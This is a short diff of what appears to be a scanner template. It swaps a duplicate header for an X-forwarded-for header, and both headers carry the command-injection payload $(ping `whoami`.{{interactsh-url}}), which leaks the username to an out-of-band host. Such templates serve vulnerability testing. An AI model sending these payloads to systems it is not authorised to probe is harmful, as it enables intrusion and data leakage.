@@ -19,7 +19,8 @@ http:
         GET / HTTP/1.1
         Host: {{Hostname}}
         x-request-id: $(ping `whoami`.{{interactsh-url}})
-        x-request-id: $(ping `whoami`.{{interactsh-url}})
+        X-forwarded-for: $(ping `whoami`.{{interactsh-url}})
+
 
     matchers:
       - type: word
